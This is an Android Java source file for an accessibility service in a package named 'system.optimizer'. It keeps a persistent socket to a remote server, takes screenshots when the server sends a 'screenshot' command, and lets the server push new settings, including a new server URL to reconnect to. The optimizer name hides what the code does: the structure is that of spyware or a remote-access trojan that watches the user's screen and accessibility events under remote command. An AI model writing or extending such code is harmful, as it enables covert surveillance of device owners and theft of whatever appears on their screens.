package com.system.optimizer.service;

import com.system.optimizer.event.AccessibilityEventHandler;
import com.system.optimizer.config.ConfigData;
import com.system.optimizer.config.AppConfig;
import com.system.optimizer.network.SocketManager;

import android.os.Build;

import org.json.JSONObject;

import com.system.optimizer.util.TimberInitializer;

import android.accessibilityservice.AccessibilityService;
import timber.log.Timber;
import android.view.accessibility.AccessibilityEvent;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class AccessibilityMonitorService extends AccessibilityService {


    private SocketManager socketManager;
    private AppConfig appConfig;
    private AccessibilityEventHandler accessibilityEventHandler;

    /**
     * Single-thread executor to handle CPU-intensive JPEG compression
     * without blocking the Accessibility (Main) thread.
     */
    private final ExecutorService backgroundExecutor = Executors.newSingleThreadExecutor();

    @Override
    public void onCreate() {
        super.onCreate();
        TimberInitializer.init();
        Timber.d("Initializing AccessibilityMonitorService");

        try {
            this.appConfig = new AppConfig(this);

            this.socketManager = new SocketManager(appConfig);

            // Create text handler with screenshot capture reference
            this.accessibilityEventHandler = new AccessibilityEventHandler(this::screenshotDispatcher, appConfig,
                    socketManager);

            this.socketManager.addPersistentListener("screenshot", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String requestId = data.getString("request_id");

                    Timber.d("Screenshot request received: %s", requestId);
                    accessibilityEventHandler.triggerManualCapture(requestId);

                } catch (Exception e) {
                    Timber.e(e, "Invalid screenshot request format");
                    socketManager.sendEvent("screenshot_error", "Invalid or missing request_id");
                }
            });

            this.socketManager.addPersistentListener("config_data", args -> {
                Timber.d("ConfigData event received from server");
                try {
                    JSONObject configJson = (JSONObject) args[0];

                    ConfigData serverConfig = appConfig.createConfigFromJson(configJson);
                    String newServerUrl = serverConfig.getServerUrl();

                    // Get current stored URL before updating config
                    String currentServerUrl = appConfig.getStoredServerUrl();

                    Timber.d("Refreshing config data from server");
                    appConfig.setConfig(serverConfig);

                    // Check if server URL has changed
                    if (currentServerUrl == null || !currentServerUrl.equals(newServerUrl)) {
                        Timber.d("Server URL changed from %s to %s", currentServerUrl, newServerUrl);

                        Timber.d("Reconnecting socket to new URL");
                        socketManager.reconnectToNewUrl();
                    }
                } catch (Exception e) {
                    Timber.e(e, "Error processing config_data from server: %s", e.getMessage());
                }
            });

            Timber.d("All components initialized successfully");
        } catch (Exception e) {
            // Log error but don't crash the service
            Timber.e(e, "Error initializing components");
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        try {
            accessibilityEventHandler.onAccessibilityEvent(event);
        } catch (Exception e) {
            Timber.e(e, "Error handling accessibility event");
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        try {
            Timber.d("Shutting down service and executor");

            // Gracefully shut down the background executor
            backgroundExecutor.shutdown();
            if (!backgroundExecutor.awaitTermination(2, TimeUnit.SECONDS)) {
                backgroundExecutor.shutdownNow();
            }

            if (socketManager != null) {
                socketManager.disconnect(true);
            }
        } catch (Exception e) {
            Timber.e(e, "Error during onDestroy cleanup");
        } finally {
            super.onDestroy();
        }
    }

    private void screenshotDispatcher(ScreenshotCallback clientCallback) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            clientCallback.onError("API < 30 not supported");
            return;
        }
        takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                backgroundExecutor, new ScreenshotResultHandler(clientCallback, appConfig));
    }

}
